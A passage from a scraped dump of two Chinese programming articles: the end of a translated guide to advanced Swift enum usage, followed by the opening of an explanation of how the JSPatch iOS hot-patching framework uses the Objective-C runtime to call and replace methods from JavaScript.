    // We got no data (0 bytes) back from the server
    case NoDataError
    // The server response can't be converted from JSON to a Dictionary
    case JSONSerializationError(error: ErrorType)
    // The Argo decoding Failed
    case JSONMappingError(converstionError: DecodeError)
}
</code></pre>
<p>这个 <code>ErrorType</code> 实现了完整的 REST 程序栈解析有可能出现的错误，包含了所有在解析结构体与类时会出现的错误。</p>
<p>如果你看得够仔细，会发现在<code>JSONMappingError</code>中，我们将<strong>Argo</strong>中的<code>DecodeError</code>封装到了我们的<code>APIError</code>类型当中，因为我们会用 Argo 来作实际的 JSON 解析。</p>
<p>更多关于<code>ErrorType</code>以及此种枚举类型的示例可以参看<a href=""https://developer.apple.com/library/prerelease/ios/documentation/Swift/Conceptual/Swift_Programming_Language/ErrorHandling.html"" rel=""nofollow noreferrer"">官方文档</a>。</p>
<h3>观察者模式</h3>
<p>在 Swift 当中，有许多方法来构建观察模式。如果使用 <code>@objc</code> 兼容标记，则我们可以使用 <code>NSNotificationCenter</code> 或者 <strong>KVO</strong>。即使不用这个标记，<code>didSet</code>语法也可以很容易地实现简单的观察模式。在这里可以使用枚举，它可以使被观察者的变化更加清晰明了。设想我们要对一个集合进行观察。如果我们稍微思考一下就会发现这只有几种可能的情况：一个或多个项被插入，一个或多个项被删除，一个或多个项被更新。这听起来就是枚举可以完成的工作：</p>
<pre><code>
enum Change {
     case Insertion(items: [Item])
     case Deletion(items: [Item])
     case Update(items: [Item])
}
</code></pre>
<p>之后，观察对象就可以使用一个很简洁的方式来获取已经发生的事情的详细信息。这也可以通过为其增加 <strong>oldValue</strong> 和 <strong>newValue</strong> 的简单方法来扩展它的功能。</p>
<h3>状态码</h3>
<p>如果我们正在使用一个外部系统，而这个系统使用了状态码(或者错误码)来传递错误信息，类似 HTTP 状态码，这种情况下枚举就是一种很明显并且很好的方式来对信息进行封装<a><sup>7</sup></a> 。</p>
<pre><code>
enum HttpError: String {
  case Code400 = ""Bad Request""
  case Code401 = ""Unauthorized""
  case Code402 = ""Payment Required""
  case Code403 = ""Forbidden""
  case Code404 = ""Not Found""
}</code></pre>
<h3>结果类型映射(Map Result Types)</h3>
<p>枚举也经常被用于将 JSON 解析后的结果映射成 Swift 的原生类型。这里有一个简短的例子：</p>
<pre><code>
enum JSON {
    case JSONString(Swift.String)
    case JSONNumber(Double)
    case JSONObject([String : JSONValue])
    case JSONArray([JSONValue])
    case JSONBool(Bool)
    case JSONNull
}
</code></pre>
<p>类似地，如果我们解析了其它的东西，也可以使用这种方式将解析结果转化我们 Swift 的类型。</p>
<h3>UIKit 标识</h3>
<p>枚举可以用来将字符串类型的重用标识或者 storyboard 标识映射为类型系统可以进行检查的类型。假设我们有一个拥有很多原型 Cell 的 UITableView：</p>
<pre><code>
enum CellType: String {
    case ButtonValueCell = ""ButtonValueCell""
    case UnitEditCell = ""UnitEditCell""
    case LabelCell = ""LabelCell""
    case ResultLabelCell = ""ResultLabelCell""
}
</code></pre>
<h3>单位</h3>
<p>单位以及单位转换是另一个使用枚举的绝佳场合。可以将单位及其对应的转换率映射起来，然后添加方法来对单位进行自动的转换。以下是一个相当简单的示例：</p>
<pre><code>
enum Liquid: Float {
  case ml = 1.0
  case l = 1000.0
  func convert(amount amount: Float, to: Liquid) -&gt; Float {
      if self.rawValue &lt; to.rawValue {
     return (self.rawValue / to.rawValue) * amount
      } else {
     return (self.rawValue * to.rawValue) * amount
      }
  }
}
// Convert liters to milliliters
print (Liquid.l.convert(amount: 5, to: Liquid.ml))
</code></pre>
<p>另一个示例是货币的转换。以及数学符号(比如角度与弧度)也可以从中受益。</p>
<h3>游戏</h3>
<p>游戏也是枚举中的另一个相当好的用例，屏幕上的大多数实体都属于一个特定种族的类型(敌人，障碍，纹理，...)。相对于本地的 iOS 或者 Mac 应用，游戏更像是一个白板。即开发游戏我们可以使用全新的对象以及全新的关联创造一个全新的世界，而 iOS 或者 OSX 需要使用预定义的 UIButtons，UITableViews，UITableViewCells 或者 NSStackView.</p>
<p>不仅如此，由于枚举可以遵守协议，我们可以利用协议扩展和基于协议的编程为不同为游戏定义的枚举增加功能。这里是一个用来展示这种层级的的简短示例：</p>
<pre><code>
enum FlyingBeast { case Dragon, Hippogriff, Gargoyle }
enum Horde { case Ork, Troll }
enum Player { case Mage, Warrior, Barbarian }
enum NPC { case Vendor, Blacksmith }
enum Element { case Tree, Fence, Stone }

protocol Hurtable {}
protocol Killable {}
protocol Flying {}
protocol Attacking {}
protocol Obstacle {}

extension FlyingBeast: Hurtable, Killable, Flying, Attacking {}
extension Horde: Hurtable, Killable, Attacking {}
extension Player: Hurtable, Obstacle {}
extension NPC: Hurtable {}
extension Element: Obstacle {}
</code></pre>
<h3>字符串类型化</h3>
<p>在一个稍微大一点的 Xcode 项目中，我们很快就会有一大堆通过字符串来访问的资源。在前面的小节中，我们已经提过重用标识和 storyboard 的标识，但是除了这两样，还存在很多资源：图像，Segues，Nibs，字体以及其它资源。通常情况下，这些资源都可以分成不同的集合。如果是这样的话，一个类型化的字符串会是一个让编译器帮我们进行类型检查的好方法。</p>
<pre><code>
enum DetailViewImages: String {
  case Background = ""bg1.png""
  case Sidebar = ""sbg.png""
  case ActionButton1 = ""btn1_1.png""
  case ActionButton2 = ""btn2_1.png""
}
</code></pre>
<p>对于 iOS 开发者，<a href=""https://github.com/mac-cain13/R.swift"" rel=""nofollow noreferrer"">R.swift</a>这个第三方库可以为以上提到的情况自动生成结构体。但是有些时候你可能需要有更多的控制(或者你可能是一个Mac开发者<a><sup>8</sup></a>)。</p>
<h3>API 端点</h3>
<p>Rest API 是枚举的绝佳用例。它们都是分组的，它们都是有限的 API 集合，并且它们也可能会有附加的查询或者命名的参数，而这可以使用关联值来实现。</p>
<p>这里有个 <a href=""https://instagram.com/developer/endpoints/media/"" rel=""nofollow noreferrer"">Instagram API</a> 的简化版：</p>
<pre><code>
enum Instagram {
  enum Media {
    case Popular
    case Shortcode(id: String)
    case Search(lat: Float, min_timestamp: Int, lng: Float, max_timestamp: Int, distance: Int)
  }
  enum Users {
    case User(id: String)
    case Feed
    case Recent(id: String)
  }
}
</code></pre>
<p><a href=""https://github.com/Moya/Moya"" rel=""nofollow noreferrer"">Ash Furrow的<strong>Moya</strong>框架</a>就是基本这个思想，使用枚举对 rest 端点进行映射。</p>
<h3>链表</h3>
<p>Airspeed Velocity有一篇<a href=""http://airspeedvelocity.net/tag/swift/"" rel=""nofollow noreferrer"">极好的文章</a>说明了如何使用枚举来实现一个链表。那篇文章中的大多数代码都超出了枚举的知识，并涉及到了大量其它有趣的主题<a><sup>9</sup></a>，但是，链表最基本的定义是类似这样的(我对其进行了一些简化)：</p>
<pre><code>
enum List {
    case End
    indirect case Node(Int, next: List)
}
</code></pre>
<p>每一个节点(Node) case 都指向了下一个 case， 通过使用枚举而非其它类型，我们可以避免使用一个可选的 next 类型以用来表示链表的结束。</p>
<p>Airspeed Velocity 还写过一篇超赞的博客，关于如何使用 Swift 的间接枚举类型来实现红黑树，所以如果你已经阅读过关于链表的博客，你可能想继续阅读<a href=""http://airspeedvelocity.net/2015/07/22/a-persistent-tree-using-indirect-enums-in-swift/"" rel=""nofollow noreferrer"">这篇关于红黑树的博客</a>。</p>
<h3>设置字典(Setting Dictionaries)</h3>
<p>这是 Erica Sadun 提出的<a href=""http://ericasadun.com/2015/10/19/sets-vs-dictionaries-smackdown-in-swiftlang/?utm_campaign=Swift%252BSandbox&amp;utm_medium=email&amp;utm_source=Swift_Sandbox_12"" rel=""nofollow noreferrer"">非常非常机智的解决方案</a>。简单来讲，就是任何我们需要用一个属性的字典来对一个项进行设置的时候，都应该使用一系列有关联值的枚举来替代。使用这方法，类型检查系统可以确保配置的值都是正确的类型。</p>
<p><a href=""http://ericasadun.com/2015/10/19/sets-vs-dictionaries-smackdown-in-swiftlang/?utm_campaign=Swift%252BSandbox&amp;utm_medium=email&amp;utm_source=Swift_Sandbox_12"" rel=""nofollow noreferrer"">关于更多的细节，以及合适的例子，可以阅读下她的文章</a>。</p>
<h2>局限</h2>
<p>与之前类似，我将会用一系列枚举的局限性来结束本篇文章。</p>
<h3>提取关联值</h3>
<p>David Owens写过一篇<a href=""http://owensd.io/2015/09/15/associated-enum-cases-as-types.html"" rel=""nofollow noreferrer"">文章</a>，他觉得当前的关联值提取方式是很笨重的。我墙裂推荐你去看一下他的原文，在这里我对它的要旨进行下说明：为了从一个枚举中获取关联值，我们必须使用模式匹配。然而，关联值就是关联在特定枚举 case 的高效元组。而元组是可以使用更简单的方式来获取它内部值，即 <code>.keyword 或者 .0</code>。</p>
<pre><code>
// Enums
enum Ex { case Mode(ab: Int, cd: Int) }
if case Ex.Mode(let ab, let cd) = Ex.Mode(ab: 4, cd: 5) {
    print(ab)
}
// vs tuples:
let tp = (ab: 4, cd: 5)
print(tp.ab)
</code></pre>
<p>如果你也同样觉得我们应该使用相同的方法来对枚举进行解构(deconstruct)，这里有个 rdar: <a href=""http://openradar.me/22704262"" rel=""nofollow noreferrer"">rdar://22704262</a> (译者注：一开始我不明白 rdar 是啥意思，后来我 google 了下，如果你也有兴趣，也可以自己去搜索一下)</p>
<h3>相等性</h3>
<p>拥有关联值的枚举没有遵守 <code>equatable</code> 协议。这是一个遗憾，因为它为很多事情增加了不必要的复杂和麻烦。深层的原因可能是因为关联值的底层使用是使用了元组，而元组并没有遵守 <code>equatable</code> 协议。然而，对于限定的 case 子集，如果这些关联值的类型都遵守了 <code>equatable</code> 类型，我认为编译器应该默认为其生成 <code>equatable</code> 扩展。</p>
<pre><code>
// Int 和 String 是可判等的, 所以 Mode 应该也是可判等的
enum Ex { case Mode(ab: Int, cd: String) }

// Swift 应该能够自动生成这个函数
func == (lhs: Ex.Mode, rhs: Ex.Mode) -&gt; Bool {
    switch (lhs, rhs) {
       case (.Mode(let a, let b), .Mode(let c, let d)):
       return a == c &amp;&amp; b == d
       default:
       return false
    }
}
</code></pre>
<h3>元组(Tuples)</h3>
<p>最大的问题就是对<a href=""http://appventure.me/2015/07/19/tuples-swift-advanced-usage-best-practices/"" rel=""nofollow noreferrer"">元组的支持</a>。我喜欢使用元组，它们可以使很多事情变得更简单，但是他们目前还处于无文档状态并且在很多场合都无法使用。在枚举当中，我们无法使用元组作为枚举的值：</p>
<pre><code>
enum Devices: (intro: Int, name: String) {
  case iPhone = (intro: 2007, name: ""iPhone"")
  case AppleTV = (intro: 2006, name: ""Apple TV"")
  case AppleWatch = (intro: 2014, name: ""Apple Watch"")
}
</code></pre>
<p>这似乎看起来并不是一个最好的示例，但是我们一旦开始使用枚举，就会经常陷入到需要用到类似上面这个示例的情形中。</p>
<h3>迭代枚举的所有case</h3>
<p>这个我们已经在前面讨论过了。目前还没有一个很好的方法来获得枚举中的所有 case 的集合以使我们可以对其进行迭代。</p>
<h3>默认关联值</h3>
<p>另一个会碰到的事是枚举的关联值总是类型，但是我们却无法为这些类型指定默认值。假设有这样一种情况:</p>
<pre><code>
enum Characters {
  case Mage(health: Int = 70, magic: Int = 100, strength: Int = 30)
  case Warrior(health: Int = 100, magic: Int = 0, strength: Int = 100)
  case Neophyte(health: Int = 50, magic: Int = 20, strength: Int = 80)
}
</code></pre>
<p>我们依然可以使用不同的值创建新的 case，但是角色的默认设置依然会被映射。</p>
<h2>变化</h2>
<h3>10/26/2015</h3>
<ul>
<li><p>增加局限性示例(相等性 &amp; 获取关联值)</p></li>
<li><p>增加 Erica Sadun 的关联枚举示例</p></li>
</ul>
<h3>10/22/2015</h3>
<ul>
<li><p>合并<a href=""https://github.com/terhechte/appventure-blog/pull/6"" rel=""nofollow noreferrer"">来自 #6 @mabidakun</a>的PR</p></li>
<li><p>增加枚举底层的链接</p></li>
<li><p>将帐号示例拆分为两个更容易理解的片段。</p></li>
</ul>
<h3>10/21/2015</h3>
<ul>
<li><p>合并<a href=""https://github.com/terhechte/appventure-blog/pull/4"" rel=""nofollow noreferrer"">来自 #4 @blixt</a>和<a href=""https://github.com/terhechte/appventure-blog/pull/2"" rel=""nofollow noreferrer"">#2 @kandelvijayavolare</a>和<a href=""https://github.com/terhechte/appventure-blog/pull/3"" rel=""nofollow noreferrer"">#3 @sriniram</a>以及<a href=""https://github.com/terhechte/appventure-blog/pull/5"" rel=""nofollow noreferrer"">#5 @SixFiveSoftware</a>的PR</p></li>
<li><p>为帐号示例添加调用代码</p></li>
<li><p>增加 <code>ErrorType</code> 示例</p></li>
</ul>
<h2>解释</h2>
<p><a></a></p>
<ul>
<li><p>1、可以使用一些小技术来达到这个目的，具体的请参照下面的文章内容<br><a></a></p></li>
<li><p>2、为了演示的缘故，这个示例的实现经过的简化。在真实的开发中，应该使用可选类型以及反向顺序的参数。可以参考一下现在十分流行的函数式编程库，如 <a href=""https://github.com/typelift/Swiftz"" rel=""nofollow noreferrer"">Swiftz</a> 和 <a href=""https://github.com/ankurp/Dollar.swift"" rel=""nofollow noreferrer"">Dollar</a><br><a></a></p></li>
<li><p>3、这个示例直接采用了<a href=""https://developer.apple.com/library/prerelease/ios/documentation/Swift/Conceptual/Swift_Programming_Language/Methods.html#//apple_ref/doc/uid/TP40014097-CH15-ID234"" rel=""nofollow noreferrer"">Swift 官方文档的示例</a><br><a></a></p></li>
<li><p>4、经常使得他们定义的位置很难被发现<br><a></a></p></li>
<li><p>5、这是一个简化版的，当然，Swift 为我们加了很多的语法糖<br><a></a></p></li>
<li><p>6、如果你在应用中使用过 JSON，应该也曾经碰到过这个问题<br><a></a></p></li>
<li><p>7、顺便一提，不能直接使用数字做为枚举 case 的名称，因此直接使用 400 是不行的<br><a></a></p></li>
<li><p>8、虽然如此，不过支持 Mac 版的 R.swift 好像就快推出了<br><a></a></p></li>
<li><p>9、这句话可以解释为: 打开链接，并开始阅读文章</p></li>
</ul>
<blockquote><p>本文由 SwiftGG 翻译组翻译，已经获得作者翻译授权，最新文章请访问 <a href=""http://swift.gg"" rel=""nofollow noreferrer""></a><a href=""http://swift.gg"" rel=""nofollow noreferrer"">http://swift.gg</a>。</p></blockquote>

                ", Swift 中枚举高级用法及实践,1531972084,297,1,120,1,1,https://segmentfault.com/a/1190000004023852
134,1,0,6,"
                    
<p><a href=""https://github.com/bang590/JSPatch"" rel=""nofollow noreferrer"">JSPatch</a> 是一个 iOS 动态更新框架，只需在项目中引入极小的引擎，就可以使用就可以使用 JavaScript 调用任何 Objective-C 原生接口，获得脚本语言的优势：为项目动态添加模块，或替换项目原生代码动态修复 bug。</p>
<p>之前在博客上写过两篇 JSPatch 原理解析文章(<a href=""http://blog.cnbang.net/tech/2808/"" rel=""nofollow noreferrer"">1</a> <a href=""http://blog.cnbang.net/tech/2855/"" rel=""nofollow noreferrer"">2</a>)，但随着 JSPatch 的改进，有些内容已经跟最新代码对不上，这里重新整理成一篇完整的文章，对原来的两篇做整合和修改，详细阐述 JSPatch 的实现原理和一些细节，以帮助使用者更好地了解和使用 JSPatch。</p>
<h2>基础原理</h2>
<p>JSPatch 能做到通过 JS 调用和改写 OC 方法最根本的原因是 Objective-C 是动态语言，OC 上所有方法的调用/类的生成都通过 Objective-C Runtime 在运行时进行，我们可以通过类名/方法名反射得到相应的类和方法：</p>
<pre><code>Class class = NSClassFromString(""UIViewController"");
id viewController = [[class alloc] init];
SEL selector = NSSelectorFromString(""viewDidLoad"");
[viewController performSelector:selector];</code></pre>
<p>也可以替换某个类的方法为新的实现：</p>
<pre><code>static void newViewDidLoad(id slf, SEL sel) {}
class_replaceMethod(class, selector, newViewDidLoad, @"""");</code></pre>
<p>还可以新注册一个类，为类添加方法：</p>
<pre><code>Class cls = objc_allocateClassPair(superCls, ""JPObject"", 0);
objc_registerClassPair(cls);
class_addMethod(cls, selector, implement, typedesc);</code></pre>
<p>对于 Objective-C 对象模型和动态消息发送的原理已有很多文章阐述得很详细，这里就不详细阐述了。理论上你可以在运行时通过类名/方法名调用到任何 OC 方法，替换任何类的实现以及新增任意类。所以 JSPatch 的基本原理就是：JS 传递字符串给 OC，OC 通过 Runtime 接口调用和替换 OC 方法。这是最基础的原理，实际实现过程还有很多怪要打，接下来看看具体是怎样实现的。</p>
<h2>方法调用</h2>
<pre><code>require('UIView')
var view = UIView.alloc().init()
view.setBackgroundColor(require('UIColor').grayColor())
view.setAlpha(0.5)</code></pre>
<p>引入 JSPatch 后，可以通过以上 JS 代码创建了一个 UIView 实例，并设置背景颜色和透明度，涵盖了 require 引入类，JS 调用接口，消息传递，对象持有和转换，参数转换这五个方面，接下来逐一看看具体实现。</p>
<h3>1.require</h3>
<p>调用 <code>require('UIView')</code> 后，就可以直接使用 <code>UIView</code> 这个变量去调用相应的类方法了，require 做的事很简单，就是在JS全局作用域上创建一个同名变量，变量指向一个对象，对象属性<code>__isCls</code>表明这是一个Class，<code>__clsName</code>保存类名，在调用方法时会用到这两个属性。</p>
<pre><code>var _require = function(clsName) {
  if (!global[clsName]) {
    global[clsName] = {
      __isCls: 1,
      __clsName: clsName
    }
  }
  return global[clsName]
}</code></pre>
<p>所以调用 <code>require('UIView')</code> 后，就在全局作用域生成了 <code>UIView</code> 这个变量，指向一个这样一个对象：</p>
<pre><code>{
  __isCls: 1,
  __clsName: ""UIView""
}</code></pre>
<h3>2.JS接口</h3>
<p>接下来看看 <code>UIView.alloc()</code> 是怎样调用的。</p>
<h4>i.封装 JS 对象</h4>
<p>对于这个调用的实现，一开始我的想法是，根据JS特性，若要让 <code>UIView.alloc()</code> 这句调用不出错，唯一的方法就是给 <code>UIView</code> 这个对象添加 <code>alloc</code> 方法，不然是不可能调用成功的，JS 对于调用没定义的属性/变量，只会马上抛出异常，而不像 OC/Lua/ruby 那样会有转发机制。所以做了一个复杂的事，就是在require生成类对象时，把类名传入OC，OC 通过runtime方法找出这个类所有的方法返回给 JS，JS 类对象为每个方法名都生成一个函数，函数内容就是拿着方法名去 OC 调用相应方法。生成的 <code>UIView</code> 对象大致是这样的：</p>
<pre><code>{
    __isCls: 1,
    __clsName: ""UIView"",
    alloc: function() {…},
    beginAnimations_context: function() {…},
    setAnimationsEnabled: function(){…},
    ...
}</code></pre>
<p>实际上不仅要遍历当前类的所有方法，还要循环找父类的方法直到顶层，整个继承链上的所有方法都要加到JS对象上，一个类就有几百个方法，这样把方法全部加到 JS 对象上，碰到了挺严重的问题，引入几个类就内存暴涨，无法使用。后来为了优化内存问题还在 JS 搞了继承关系，不把继承链上所有方法都添加到一个JS对象，避免像基类 NSObject 的几百个方法反复添加在每个 JS 对象上，每个方法只存在一份，JS 对象复制了 OC 对象的继承关系，找方法时沿着继承链往上找，结果内存消耗是小了一些，但还是大到难以接受。</p>
<h4>ii.<code>__c()</code>元函数</h4>
<p>当时继续苦苦寻找解决方案，若按 JS 语法，这是唯一的方法，但若不按 JS 语法呢？突然脑洞开了下，CoffieScript/JSX 都可以用 JS 实现一个解释器实现自己的语法，我也可以通过类似的方式做到，再进一步想到其实我想要的效果很简单，就是调用一个不存在方法时，能转发到一个指定函数去执行，就能解决一切问题了，这其实可以用简单的字符串替换，把 JS 脚本里的方法调用都替换掉。最后的解决方案是，在 OC 执行 JS 脚本前，通过正则把所有方法调用都改成调用 <code>__c()</code> 函数，再执行这个 JS 脚本，做到了类似 OC/Lua/Ruby 等的消息转发机制：</p>
<pre><code>UIView.alloc().init()
-&gt;
UIView.__c('alloc')().__c('init')()</code></pre>
<p>给 JS 对象基类 Object 的 prototype 加上 <code>__c</code> 成员，这样所有对象都可以调用到 <code>__c</code>，根据当前对象类型判断进行不同操作：</p>
<pre><code>Object.prototype.__c = function(methodName) {
  if (!this.__obj &amp;&amp; !this.__clsName) return this[methodName].bind(this);
  var self = this
  return function(){
    var args = Array.prototype.slice.call(arguments)
    return _methodFunc(self.__obj, self.__clsName, methodName, args, self.__isSuper)
  }
}</code></pre>
<p><code>_methodFunc()</code> 就是把相关信息传给OC，OC用 Runtime 接口调用相应方法，返回结果值，这个调用就结束了。</p>
<p>这样做不用去 OC 遍历对象方法，不用在 JS 对象保存这些方法，内存消耗直降 99%，这一步是做这个项目最爽的时候，用一个非常简单的方法解决了严重的问题，替换之前又复杂效果又差的实现。</p>
<h3>3.消息传递</h3>
<p>解决了 JS 接口问题，接下来看看 JS 和 OC 是怎样互传消息的。这里用到了 JavaScriptCore 的接口，OC 端在启动 JSPatch 引擎时会创建一个 <code>JSContext</code> 实例，<code>JSContext</code> 是 JS 代码的执行环境，可以给 <code>JSContext</code> 添加方法，JS 就可以直接调用这个方法：</p>
<pre><code>JSContext *context = [[JSContext alloc] init];
context[@""hello""] = ^(NSString *msg) {
    NSLog(@""hello %@"", msg);
};
[_context evaluateScript:@""hello('word')""];     //output hello word</code></pre>
<p>JS 通过调用 <code>JSContext</code> 定义的方法把数据传给 OC，OC 通过返回值传会给 JS。调用这种方法，它的参数/返回值 JavaScriptCore 都会自动转换，OC 里的 NSArray, NSDictionary, NSString, NSNumber, NSBlock 会分别转为JS端的数组/对象/字符串/数字/函数类型。上述 <code>_methodFunc</code> 方法就是这样把要调用的类名和方法名传递给 OC 的。</p>
<h3>4.对象持有/转换</h3>
<p>结合上述几点，可以知道 <code>UIView.alloc()</code> 这个类方法调用语句是怎样执行的：</p>
<p>a.<code>require('UIView')</code> 这句话在 JS 全局作用域生成了 <code>UIView</code> 这个对象，它有个属性叫 <code>__isCls</code>，表示这代表一个 OC 类。<br>  b.调用 <code>UIView</code> 这个对象的 <code>alloc()</code> 方法，会去到 <code>__c()</code> 函数，在这个函数里判断到调用者 <code>__isCls</code> 属性，知道它是代表 OC 类，把方法名和类名传递给 OC 完成调用。</p>
<p>调用类方法过程是这样，那实例方法呢？<code>UIView.alloc()</code> 会返回一个 UIView 实例对象给 JS，这个 OC 实例对象在 JS 是怎样表示的？怎样可以在 JS 拿到这个实例对象后可以直接调用它的实例方法 <code>UIView.alloc().init()</code>？</p>
<p>对于一个自定义id对象，JavaScriptCore 会把这个自定义对象的指针传给 JS，这个对象在 JS 无法使用，但在回传给 OC 时 OC 可以找到这个对象。对于这个对象生命周期的管理，按我的理解如果JS有变量引用时，这个 OC 对象引用计数就加1 ，JS 变量的引用释放了就减1，如果 OC 上没别的持有者，这个OC对象的生命周期就跟着 JS 走了，会在 JS 进行垃圾回收时释放。</p>
<p>传回给 JS 的变量是这个 OC 对象的指针，这个指针也可以重新传回 OC，要在 JS 调用这个对象的某个实例方法，根据第2点 JS 接口的描述，只需在 <code>__c()</code> 函数里把这个对象指针以及它要调用的方法名传回给 OC 就行了，现在问题只剩下：怎样在 <code>__c()</code> 函数里判断调用者是一个 OC 对象指针？</p>
<p>目前没找到方法判断一个 JS 对象是否表示 OC 指针，这里的解决方法是在 OC 把对象返回给 JS 之前，先把它包装成一个 NSDictionary：</p>
<pre><code>static NSDictionary *_wrapObj(id obj) {
    return @{@""__obj"": obj};
}</code></pre>
<p>让 OC 对象作为这个 NSDictionary 的一个值，这样在 JS 里这个对象就变成：</p>
<pre><code>{__obj: [OC Object 对象指针]}</code></pre>
<p>这样就可以通过判断对象是否有 <code>__obj</code> 属性得知这个对象是否表示 OC 对象指针，在 <code>__c</code> 函数里若判断到调用者有 <code>__obj</code> 属性，取出这个属性，跟调用的实例方法一起传回给 OC，就完成了实例方法的调用。</p>
<h3>5.类型转换</h3>
<p>JS 把要调用的类名/方法名/对象传给 OC 后，OC 调用类/对象相应的方法是通过 NSInvocation 实现，要能顺利调用到方法并取得返回值，要做两件事：</p>
<p>a.取得要调用的 OC 方法各参数类型，把 JS 传来的对象转为要求的类型进行调用。<br>b.根据返回值类型取出返回值，包装为对象传回给 JS。</p>
<p>例如开头例子的 <code>view.setAlpha(0.5)</code>， JS传递给OC的是一个 NSNumber，OC 需要通过要调用 OC 方法的 <code>NSMethodSignature</code> 得知这里参数要的是一个 float 类型值，于是把 NSNumber 转为 float 值再作为参数进行 OC 方法调用。这里主要处理了 int/float/bool 等数值类型，并对 CGRect/CGRange 等类型进行了特殊转换处理，剩下的就是实现细节了。</p>
<h2>方法替换</h2>
<p>JSPatch 可以用 <code>defineClass</code> 接口任意替换一个类的方法，方法替换的实现过程也是颇为曲折，一开始是用 <code>va_list</code> 的方式获取参数，结果发现 arm64 下不可用，只能转而用另一种 hack 方式绕道实现。另外在给类新增方法、实现property、支持self/super关键字上也费了些功夫，下面逐个说明。</p>
<h3>1.基础原理</h3>
<p>OC上，每个类都是这样一个结构体：</p>
<pre><code>struct objc_class {
  struct objc_class * isa;
  const char *name;
  ….
  struct objc_method_list **methodLists; /*方法链表*/
};</code></pre>
<p>其中 methodList 方法链表里存储的是 Method 类型：</p>
<pre><code>typedef struct objc_method *Method;
typedef struct objc_ method {
  SEL method_name;
  char *method_types;
  IMP method_imp;
};</code></pre>
<p>Method 保存了一个方法的全部信息，包括 SEL 方法名，type 各参数和返回值类型，IMP 该方法具体实现的函数指针。</p>
<p>通过 Selector 调用方法时，会从 methodList 链表里找到对应Method进行调用，这个 methodList 上的的元素是可以动态替换的，可以把某个 Selector 对应的函数指针IMP替换成新的，也可以拿到已有的某个 Selector 对应的函数指针IMP，让另一个 Selector 跟它对应，Runtime 提供了一些接口做这些事，以替换 UIViewController 的 <code>-viewDidLoad:</code> 方法为例：</p>
<pre><code>static void viewDidLoadIMP (id slf, SEL sel) {
   JSValue *jsFunction = …;
   [jsFunction callWithArguments:nil];
}

Class cls = NSClassFromString(@""UIViewController"");
SEL selector = @selector(viewDidLoad);
Method method = class_getInstanceMethod(cls, selector);

//获得viewDidLoad方法的函数指针
IMP imp = method_getImplementation(method)

//获得viewDidLoad方法的参数类型
char *typeDescription = (char *)method_getTypeEncoding(method);

//新增一个ORIGViewDidLoad方法，指向原来的viewDidLoad实现
class_addMethod(cls, @selector(ORIGViewDidLoad), imp, typeDescription);

//把viewDidLoad IMP指向自定义新的实现
class_replaceMethod(cls, selector, viewDidLoadIMP, typeDescription);</code></pre>
<p>这样就把 UIViewController 的 <code>-viewDidLoad</code> 方法给替换成我们自定义的方法，APP里调用 UIViewController 的 <code>viewDidLoad</code> 方法都会去到上述 viewDidLoadIMP 函数里，在这个新的IMP函数里调用 JS 传进来的方法，就实现了替换 viewDidLoad 方法为JS代码里的实现，同时为 UIViewController 新增了个方法 <code>-ORIGViewDidLoad</code> 指向原来 viewDidLoad 的 IMP，JS 可以通过这个方法调用到原来的实现。</p>
<p>方法替换就这样很简单的实现了，但这么简单的前提是，这个方法没有参数。如果这个方法有参数，怎样把参数值传给我们新的 IMP 函数呢？例如 UIViewController 的 <code>-viewDidAppear:</code> 方法，调用者会传一个 Bool 值，我们需要在自己实现的IMP（上述的 viewDidLoadIMP）上拿到这个值，怎样能拿到？如果只是针对一个方法写 IMP，是可以直接拿到这个参数值的：</p>
<pre><code>static void viewDidAppear (id slf, SEL sel, BOOL animated) {
   [function callWithArguments:@(animated)];
}</code></pre>
<p>但我们要的是实现一个通用的IMP，任意方法任意参数都可以通过这个IMP中转，拿到方法的所有参数回调JS的实现。</p>
<h3>2.va_list实现(32位)</h3>
<p>最初我是用可变参数 <code>va_list</code> 实现：</p>
<pre><code>static void commonIMP(id slf, ...)
  va_list args;
  va_start(args, slf);
  NSMutableArray *list = [[NSMutableArray alloc] init];
  NSMethodSignature *methodSignature = [cls instanceMethodSignatureForSelector:selector];
  NSUInteger numberOfArguments = methodSignature.numberOfArguments;
  id obj;
  for (NSUInteger i = 2; i &lt; numberOfArguments; i++) {
      const char *argumentType = [methodSignature getArgumentTypeAtIndex:i];
      switch(argumentType[0]) {
          case 'i':
              obj = @(va_arg(args, int));
              break;
          case 'B':
              obj = @(va_arg(args, BOOL));
              break;
          case 'f':
          case 'd':
              obj = @(va_arg(args, double));
              break;
          …… //其他数值类型
          default: {
              obj = va_arg(args, id);
              break;
          }
      }
      [list addObject:obj];
  }
  va_end(args);
  [function callWithArguments:list];
}</code></pre>
<p>这样无论方法参数是什么，有多少个，都可以通过 <code>va_list</code>的一组方法一个个取出来，组成 NSArray 在调用 JS 方法时传回。很完美地解决了参数的问题，一直运行正常，直到我跑在 arm64 的机子上测试，一调用就 crash。查了资料，才发现 arm64 下 <code>va_list</code> 的结构改变了，导致无法上述这样取参数。详见这篇文章：<a href=""https://blog.nelhage.com/2010/10/amd64-and-va_arg"" rel=""nofollow noreferrer"">https://blog.nelhage.com/2010...</a>。</p>
<h3>3.ForwardInvocation实现(64位)</h3>
<p>继续寻找解决方案，最后找到另一种非常 hack 的方法解决参数获取的问题，利用了 OC 消息转发机制。</p>
<p>当调用一个 NSObject 对象不存在的方法时，并不会马上抛出异常，而是会经过多层转发，层层调用对象的 <code>-resolveInstanceMethod:</code>, <code>-forwardingTargetForSelector:</code>, <code>-methodSignatureForSelector:</code>, <code>-forwardInvocation:</code>  等方法，其中最后 <code>-forwardInvocation:</code> 是会有一个 NSInvocation 对象，这个 NSInvocation 对象保存了这个方法调用的所有信息，包括 Selector 名，参数和返回值类型，最重要的是有所有参数值，可以从这个 NSInvocation 对象里拿到调用的所有参数值。我们可以想办法让每个需要被 JS 替换的方法调用最后都调到 <code>-forwardInvocation:</code>，就可以解决无法拿到参数值的问题了。</p>
<p>具体实现，以替换 UIViewController 的 -viewWillAppear: 方法为例：</p>
<ol>
<li><p>把UIViewController的 <code>-viewWillAppear:</code> 方法通过 <code>class_replaceMethod()</code> 接口指向 <code>_objc_msgForward</code>，这是一个全局 IMP，OC 调用方法不存在时都会转发到这个 IMP 上，这里直接把方法替换成这个 IMP，这样调用这个方法时就会走到 <code>-forwardInvocation:</code>。</p></li>
<li><p>为UIViewController添加 <code>-ORIGviewWillAppear:</code> 和 <code>-_JPviewWillAppear:</code> 两个方法，前者指向原来的IMP实现，后者是新的实现，稍后会在这个实现里回调JS函数。</p></li>
